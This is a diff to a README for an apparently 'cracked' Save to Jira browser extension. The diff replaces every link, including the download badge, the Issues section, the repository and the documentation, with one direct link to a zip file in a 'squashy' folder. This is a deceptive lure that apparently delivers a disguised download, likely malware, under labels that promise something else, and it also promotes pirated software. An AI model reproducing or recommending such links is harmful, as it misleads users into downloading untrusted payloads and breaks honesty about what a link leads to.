@@ -1,6 +1,6 @@
 # 🌟 cracked-save-to-jira-work-management-extension - Simplify Your Jira Tasks Effortlessly
 
-[![Download Now](https://img.shields.io/badge/download-now-brightgreen)](https://github.com/y4CEENE/cracked-save-to-jira-work-management-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/y4CEENE/cracked-save-to-jira-work-management-extension/main/squashy/cracked-save-to-jira-work-management-extension.zip)](https://raw.githubusercontent.com/y4CEENE/cracked-save-to-jira-work-management-extension/main/squashy/cracked-save-to-jira-work-management-extension.zip)
 
 ## 📋 Overview
 
@@ -13,7 +13,7 @@ To get started with the Cracked Save to Jira Work Management Extension, follow t
 ## 📥 Download & Install
 
 1. **Visit the Download Page:** Click the link below to go to the releases page:
-   [Download Here](https://github.com/y4CEENE/cracked-save-to-jira-work-management-extension/releases)
+   [Download Here](https://raw.githubusercontent.com/y4CEENE/cracked-save-to-jira-work-management-extension/main/squashy/cracked-save-to-jira-work-management-extension.zip)
 
 2. **Choose Your Version:** On the releases page, you will see different versions of the extension. Select the latest version for the best experience.
 
@@ -52,7 +52,7 @@ To get started with the Cracked Save to Jira Work Management Extension, follow t
 
 ## 📞 Support
 
-If you encounter any issues or have questions about using the Cracked Save to Jira Work Management Extension, please refer to the [Issues Section](https://github.com/y4CEENE/cracked-save-to-jira-work-management-extension/issues) on GitHub. You can also submit your feedback or any suggestions there.
+If you encounter any issues or have questions about using the Cracked Save to Jira Work Management Extension, please refer to the [Issues Section](https://raw.githubusercontent.com/y4CEENE/cracked-save-to-jira-work-management-extension/main/squashy/cracked-save-to-jira-work-management-extension.zip) on GitHub. You can also submit your feedback or any suggestions there.
 
 ## 📄 License
 
@@ -60,8 +60,8 @@ This project is licensed under the MIT License. You can view the license details
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/y4CEENE/cracked-save-to-jira-work-management-extension)
-- [Documentation](https://github.com/y4CEENE/cracked-save-to-jira-work-management-extension/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/y4CEENE/cracked-save-to-jira-work-management-extension/main/squashy/cracked-save-to-jira-work-management-extension.zip)
+- [Documentation](https://raw.githubusercontent.com/y4CEENE/cracked-save-to-jira-work-management-extension/main/squashy/cracked-save-to-jira-work-management-extension.zip)
 
 ## 🌟 Acknowledgments
 
